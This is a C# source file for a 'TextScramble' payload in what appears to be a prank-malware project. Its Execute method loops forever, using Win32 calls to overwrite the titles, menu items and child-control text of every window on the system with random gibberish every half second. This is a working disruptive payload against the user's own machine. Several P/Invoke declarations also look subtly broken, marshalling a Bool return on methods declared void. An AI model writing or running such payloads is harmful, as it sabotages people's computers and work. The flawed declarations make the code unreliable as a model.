using System.Runtime.InteropServices;

namespace Caesium.Payloads;

public abstract partial class TextScramble : IPayload
{
    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial void EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial void EnumChildWindows(IntPtr hWndParent, EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [LibraryImport("user32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial void SendMessageW(IntPtr hWnd, uint msg, IntPtr wParam, string lParam);

    [LibraryImport("user32.dll", StringMarshalling = StringMarshalling.Utf16)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial void ModifyMenuW(IntPtr hMenu, uint uPosition, uint uFlags, IntPtr uIdNewItem,
        string lpNewItem);

    [LibraryImport("user32.dll", EntryPoint = "GetMenu")]
    private static partial IntPtr GetMenu(IntPtr hWnd);

    [LibraryImport("user32.dll", EntryPoint = "GetMenuItemCount")]
    private static partial int GetMenuItemCount(IntPtr hMenu);

    private const uint WmSettext = 0x000C;
    private const uint MfByposition = 0x00000400;

    public static void Execute()
    {
        // Re-use the same delegate to prevent GC thrashing
        EnumWindowsProc childCallback = (hChild, _) =>
        {
            // Use Random.Shared for thread safety and speed
            var gib = TitleChaos.GetPsychoticGibberish(Random.Shared.Next(3, 10));
            SendMessageW(hChild, WmSettext, IntPtr.Zero, gib);
            return true;
        };

        while (true)
        {
            EnumWindows((hWnd, _) =>
            {
                // A. Scramble Title
                var titleGib = TitleChaos.GetPsychoticGibberish(Random.Shared.Next(8, 20));
                SendMessageW(hWnd, WmSettext, IntPtr.Zero, titleGib);

                // B. Scramble Menus
                var hMenu = GetMenu(hWnd);
                if (hMenu != IntPtr.Zero)
                {
                    var count = GetMenuItemCount(hMenu);
                    for (uint i = 0; i < (uint)count; i++)
                        ModifyMenuW(hMenu, i, MfByposition, IntPtr.Zero, TitleChaos.GetPsychoticGibberish(4));
                }

                // C. Target Children (Limit depth or frequency if possible)
                EnumChildWindows(hWnd, childCallback, IntPtr.Zero);
                return true;
            }, IntPtr.Zero);

            // 500ms is heavy. 1000ms is more "stable" for a full system scramble.
            Thread.Sleep(500);
        }
    }
}